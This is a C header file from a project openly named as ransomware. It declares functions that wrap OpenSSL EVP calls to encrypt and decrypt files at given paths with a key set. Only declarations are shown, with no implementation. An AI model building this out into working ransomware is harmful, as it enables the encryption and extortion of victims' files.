#ifndef RANSOMWARE_EVP_H
#define RANSOMWARE_EVP_H

#include "../../lib/key/key_set.h"

#include <openssl/evp.h>

typedef enum EvpTask {
    Evp_ENCRYPT,
    Evp_DECRYPT
} EvpTask;

typedef enum EvpBufferSize {
    DEFAULT_BUFFER_SIZE = 1024,
    // + 16 for the padding
    PADDING_BUFFER_SIZE = 1040
} EvpBufferSize;

bool process(const char *path, const EvpTask *task);

const char *taskToString(const EvpTask *task);

char *getTaskPath(const char *path, const EvpTask *task);

bool evpTask(const KeySet *key_set, const char *path_in, const char *path_out,
             int (f_EVP_Init_ex)(EVP_CIPHER_CTX *ctx,
                                 const EVP_CIPHER *cipher, ENGINE *impl,
                                 const unsigned char *key,
                                 const unsigned char *iv),
             int (f_EVP_Update)(EVP_CIPHER_CTX *ctx, unsigned char *out,
                                int *outl, const unsigned char *in, int inl),
             int (f_EVP_Final_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm,
                                  int *outl),
             const EvpBufferSize *buffer_reader_size, const EvpBufferSize *buffer_writer_size);

#endif //RANSOMWARE_EVP_H
